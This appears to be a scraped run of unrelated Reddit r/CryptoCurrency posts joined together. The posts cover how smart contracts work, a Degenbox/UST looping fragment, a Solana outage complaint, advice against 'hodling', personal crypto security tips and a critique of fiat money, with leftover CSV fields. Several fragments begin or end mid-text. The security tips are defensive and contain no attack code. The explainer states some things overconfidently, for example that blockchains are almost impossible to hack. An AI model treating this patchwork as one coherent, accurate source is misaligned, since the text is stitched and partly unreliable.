How do smart contracts work? And what are they good for? I'll try to answer these questions in this post.## What are smart contracts?A smart contract is an agreement between two or more parties in the form of computer code. The contracts are stored on the blockchain and cannot be changed. Transactions that take place in a smart contract are processed by the blockchain, which means they can be sent automatically without the intervention of a third party. When you enter into an agreement with a smart contract, no confidential advisor is required. The transactions only take place if the conditions in the agreement are met.## What can smart contracts do?Smart contracts help you exchange money, stock or anything else of value in a transparent, trustless manner, all while avoiding the services of an intermediary and the possibility of conflict. Smart contracts provide you:* Autonomy - You are the one who makes the deal and you don't have to rely on an intermediary to confirm transactions. The execution is automatically managed by a decentralized network, which excludes manipulation of contracts.* Speed - Automated contracts can save you hours on manual paperwork.* Security - Smart contracts are secured with similar cryptography that encrypts websites. In short, it keeps your documents safe.* Savings - Because they disable the presence of an intermediary, smart contracts can save you a lot of money. Where, for example, you would normally have to pay a notary to witness your transaction, this is now regulated by the blockchain.* Backup - Unlike files on your computer, data on the blockchain is duplicated many times over. So you do not have to be afraid of losing something that is registered on the blockchain. Also, there is no way anyone can say they lost the contract or the dog ate it.## A smart contract in effectAs an example; If you were to register cinema tickets on the blockchain using a smart contract, then as a visitor you will receive the tickets in your personal wallet. You only have to show the address to which the tickets were sent upon entry and the cinema can immediately be sure that you do not have any fake tickets and that you have actually paid for your tickets. This gives a better customer experience and the cinema can save a lot of costs in this way because it no longer needs ticket processing services.## But why is this so safe?Thanks to blockchain technology, we can decentralize smart contracts so that they are fair and trusted. Decentralization means that they are not controlled by one central party, such as a bank or the government.The blockchain is a shared database managed by many different computers (nodes). As a result, not one person or company has control over it. It also means that it is almost impossible to hack it and therefore smart contracts can be executed securely and automatically without anyone being able to change them.## Best practices for smart contractsIn principle, smart contracts can be used for any type of transaction, it does not have to be financial. Here are some industries where smart contracts can be used conveniently.## InsurancesThe insurance world could be shaken up considerably by blockchain technology. An example of a smart contract was a project run by a French insurance company called AXA. AXA offered flight insurance that were paid out if the policyholder's flight was delayed by more than two hours. AXA was running a pilot project that payed out insurance via smart contracts on the Ethereum blockchain. Unfortunately the project has been discontinued.The smart contract worked with an if / then function: IF the flight was delayed by more than two hours, THEN the policyholder would be paid. Because the smart contract was connected to a database that keeps track of flight times, the function could be performed automatically and paid for via the Ethereum blockchain. This would have saved a lot of time for AXA, but also for the policyholder. This is just one example of the many options that smart contracts offer.## HealthcareWithin healthcare, smart contracts will be used to record and securely transfer data. We can already see examples of smart contracts used in the medical industry, such as the company Encrypgen, for example. This is an application that uses blockchain to transfer patient data in a secure manner, eliminating the need for third-party access. In this way, the patients are in control of their own data. If researchers want to use patient data, they have to pay for it. The patient also chooses whether the data may be sold or not.## GovernmentsGovernments guarantee that it is extremely difficult to manipulate the voting system, but despite that, smart contracts could alleviate all concerns by providing an infinitely more secure system. Smart contracts could also prevent low voter turnout. Much of the small turnout is due to a clunky system consisting of lining up a queue, showing your identity, and filling out forms. With the use of smart contracts, anyone can transfer their votes securely online, which is expected to generate much more response.## Business managementThere is still a lot of room for improvement within business management and smart contracts can help a lot. Why do administration when everything is registered on the blockchain anyway? Right, the blockchain is already doing the work for you. You also do not have to make a pay slip every month. The money automatically goes to your employees as soon as they have fulfilled the agreements. Companies can simply set up a smart contract that states: IF the date is 10/20/2020, THEN $2500 will be sent to employee A. This means that employees will always be paid on time and that they will never be underpaid. The advantage of the company is that it is all automated, saving them a lot of time and money!## Fundraising (ICOs)In principle, anyone could create their own token and sell it to the general public in order to raise money for a project. In 2017 there was a real ICO craze, where some projects managed to raise tens of millions within hours. There was even an EOS ICO that lasted for a year and racked up more than $ 4 billion in total!If you want to organize an ICO (Initial Coin Offering) you create a token and a contract to sell the token. The function of the smart contract in this case would be: if person A sends an X amount of ETH, person A gets an X amount of tokens.## Smart contracts in a nutshellThe most important features of a smart contract are:* Digital Agreement - A smart contract is an agreement in the form of computer code.* Blockchain - Transactions are processed by a public database, based on blockchain technology.* Confidentiality - A transaction can only take place if the conditions in the agreement are met.## ConclusionIt will be a while before smart contracts are everywhere in everyday life, but we can say with some certainty that the technology has a lot to offer.I hope this post helped you with:* Getting a better understanding of smart contracts* Understanding the significance of smart contracts within the crypto space.&#x200B;* Next post: [NFTs](https://www.reddit.com/r/CryptoCurrency/comments/mexb51/defi_explained_nfts/)* Wondering which crypto wallet you need?

Heres how he used degenbox to cash out into usdt/usdcLets start with what degenbox is: a borrowing protocol where people can loop stablecoin buys. You can stake collateral to buy UST, put it into Anchor, then use your aUST to borrow more UST, put it into Anchor again... You get the drill. It's Anchor on steroids.  Terra influencers shilled this strategy en masse, and thousands of retail users began flooding into Degenbox to access the high yields.  This created incredibly thick, near-immovable liquidity near the top of the peg zone (the $0.98 to $1.00 range). In a nutshell, it would allow for someone to cash out billions of UST for MIM at a 1:1 rate without disturbing the peg - all thanks to inorganic demand.

Solana now natively brings this kind of user experience to the blockchain where you can experience network failure on the chain. What a wonderful innovation.Blaming it on attackers is just dishonesty. A well designed blockchain is not supposed to have attackers, its supposed to keep producing blocks based on the parameters of the network, not take a break because someone spammed transactions.Edit: So Sol shills have attacked this post, here is some more 'proof'Coinbase blocked withdrawals as a result of Solana network going down[https://status.coinbase.com/incidents/clt85xbsqc1n](https://status.coinbase.com/incidents/clt85xbsqc1n)status (dot) solana..

Hodl is a meme for suckers.As prices climb youll start to hear a lot about hodling. [insert 300 and Braveheart meme here]. Just FYI: Hodl comes from the early days when folks completely forgot about their Bitcoins until one day they heard on the news that this nerd money passed $1k/coin. They dug out their old wallet (if they were lucky enough to still have access) and thus woke up millionaires.  In short: their inadvertent holding made them exceedingly wealthy. The fact is that hodl doesn't mean never sell it just means try not to sell before you're satisfied. There's nothing noble about never selling your coins‚Äîyou tell yourself you'll hodl through thick and thin‚Äîwatch the comments like I'm in cold storage and just grabbing the popcorn while the market is in free fall.‚Äîbut that means you have no idea just how cold crypto winter can get.Your loyalty will mean jack-all when your portfolio has gone from $300k to $3k. 	2. Take the Money and Run:Set a goal and STICK TO IT. If you've made life changing money, or just enough for that goal: a new car, a new computer, college loans, etc.‚Äîdon't roll the profits over into the next coin poised to explode ‚Äî  just take the money and run. Do what you planned to with it, celebrate, and enjoy your success (no matter what that success looks like). The bear will come and you can buy back in.Greed is a bottomless pit and always chasing a little bit more will never make you happy. Remember that meme of the dude at the party standing in the corner while everyone else is having fun: They dont know i have ETH. News flash: yes they do. But even so, living is way more important than hodling‚Äîand the people dancing, having a genuinely good time living life, are in a way better position than the guy in the corner with his ETH.	3. You don't start spending the money until you've lost the money.I remember the first time I experienced my portfolio climbing $5k/$10k per day. It was insanity. All of a sudden money became cheap. Easy to throw away, easy to take for granted. Amounts of money that I had never dreamed could have become accessible to me had suddenly become nothing more than crumbs. It wasn't until the proceeding bear market‚Äîwhen it had dip'-by-dip' fizzled to almost nothing did I start to think about what I could have spent all that cash on. I had tried so hard to maximize my gains that I was afraid to sell anything‚Äîlest my portfolio grow less exponentially than it otherwise would have. So many moments in the proceeding bear market where I tormented myself with questions: why didn't I at least buy a nice car? Or I could have sold enough for a house and still have more in my portfolio than I currently have, or Man I could have bought so much ETH now if I had sold back then. A lot of regret made me fall out of love with hodl.    4.  The bull market does come to an end.Yes yes‚Äîinstitutions, mainstream, celebrities, El Salvador, PayPal, etc. Blah blah blah.Remember: the institutions make money when the market goes up and they make more money when the market goes down. Governments are corrupt and will pass and nullify laws for their benefit.

As more and more newbies jump in the field, I wanted to share some security tips outside the typical not your keys, not your wallet type security as there's other ways to be hit1.) [haveibeenpwned.com](https://haveibeenpwned.com/) enter your email and see what data breaches your email(s) have been apart of. I recently helped a fellow reddit user who said his account was hacked, turns out he was part of a breach where a crypto site was hacked and his password was exposed, he reused this password on another crypto site that the attacker crossed referenced with his email / pass from the other site and didn't have 2FA activated.With that don't reuse passwords, and use auto generated passwords / store them in a encrypted password manager (I use [KeePass](https://keepass.info/))2.) Every single program/software is essentially a attack vector, keep your OS updated, keep your software updated, and uninstall ANY thing you don't use anymore. Just look up the SolarWinds hack and see how supply chain attacks work.3.) Don't download random stuff from this site or any other. If you want to, check the hash of the software. This can be done using Certutil -hashfile filename' sha256 in the windows cmd (Linux you can use sha256sum filename') you can then enter the hash into [VirusTotal.com](https://www.virustotal.com/gui/home/search) to see if it comes back malicious.4.) Keeping your seed phrase safe, I personally store it in a KeePass database file (encrypted) then put that file on 2 USB drives and store it in 2 different secure locations.5.) typical advice: Don't engage reddit messages, don't disclose your portfolio, cold wallets, and activate 2FA on your reddit account to keep your moons safe.EDIT: 6.) Don't trust email links, I've actually worked with the owner of haveibeenpwned owned on a breach I found where I found over 12K emails that were entered into phishing sites, and reported it to him. Always go to the site directly through the url address (and double check it)7.) ALSO! Forgot one of the most important ones, chrome extensions, these can have keyloggers, take screenshots, and track you. It might not be malicious when you downloaded it, but attackers generally  update them with malicious code with those capabilities or aren't updated at all which leads to potential unfixed vulnerabilities. Double check the ones you have installed, and remove any you don't need.8.) VPN / Browser, use a vpn with a no log policy to encrypt your network traffic. I personally use ProtonVPN and it's worth the few bucks a month for a paid version, brave also allows you to use TOR in browser. Another option is hardening Firefox to use as a browser if brave doesn't suite your needs which a guide can be found [here](https://informinc.org/internet/how-to-harden-your-firefox-browser-for-security-and-privacy/)EDIT EDIT:I've gotten a lot of messages regarding how to get into the Cybersecurity field and trying my best to respond to them, if there's interest I could make a post about that at some point.

There is a reason why most projects upload a simplified version that explains how the project works, and that's so that newcomers can get an idea of what the project is. Odds are that the vast majority of people trying to buy a certain cryptocurrency will be people that just don't have the background required to understand whitepapers, so let's stop recommending them to read whitepapers and instead recommend them something different, like watching videos or reading simplified articles that explain what the cryptocurrency that they want to buy is.",False,"I stopped reading whitepapers.

Governments  would have to step in to save them.* All  ties between the financial system and gold were severed in 1971 when  Nixon decided that the USD would no longer be exchangeable for a fixed  amount of gold. This exacerbated the problem, because there was now  effectively no limit anymore on the amount of paper money that banks  could create.* From  this moment on, all money was created as credit. Money ceased to be  supported by an asset. When you take out a loan, money is created and  lent to you. Banks expect this freshly minted money to be returned to  them with interest. Sure, banks need to keep adequate reserves. But  these reserves basically consist of the same credit-based money. And  reserves are much lower than the loans they make.* This  led to an explosion in the money supply. The Federal Reserve stopped  reporting M3 in 2006. But the ECB currently reports a yearly increase in  the supply of the euro of about 5%.* This  leads to a yearly increase in prices. The price increase is somewhat  lower than the increase in the money supply. This is because of  increased productivity. Society gets better at producing stuff cheaper  all the time. So, in absence of money creation you would expect prices  to drop every year. That they don't is the effect of money creation.* What remains is an inflation rate in the 2% range.* Banks  have discovered that they can siphon off all the productivity increase +  2% every year, without people complaining too much. They accomplish  this currently by increasing the money supply by 5% per year, getting  this money returned to them at an interest.* Apart  from this insidious tax on society, banks take society hostage every  couple of years. In case of a financial crisis, banks need bailouts or  the system will collapse.* Apart  from these problems, banks and governments are now striving to do away  with cash. This would mean that no two free men would be able to  exchange money without intermediation by a bank. If you believe that to  transact with others is a fundamental right, this should scare you.* The  absence of sound money was at the root of the problem. We were  force-fed paper money because there were no good alternatives. Gold and  silver remain difficult to use.* When it was tried to launch a private currency backed by precious metals  (Liberty dollar), this initiative was shut down because it undermined  the U.S. currency system. Apparently, a currency alternative could only  thrive if nobody launched it and if they was no central point of  failure.* What  was needed was a peer-to-peer electronic cash system. This was what  Satoshi Nakamoto described in 2008. It was a response to all the  problems described above. That is why he labeled the genesis block with  the text: 03/Jan/2009 Chancellor on brink of second bailout for  banks.. Bitcoin was meant to be an alternative to our current financial  system.So, if you find  yourself religiously checking some cryptocurrency's price, or bogged  down in discussions about the one true bitcoin, or constantly asking  what currency to buy, please at least remember that we have bigger fish to fry.We are here to fix the financial system.",False,Just a quick reminder why Bitcoin/Cryptocurrency was invented in the first place.,u/[deleted],108,3987,0.97,https://www.reddit.com/r/CryptoCurrency/comments/nlu2fu/just_a_quick_reminder_why_bitcoincryptocurrency/,[]
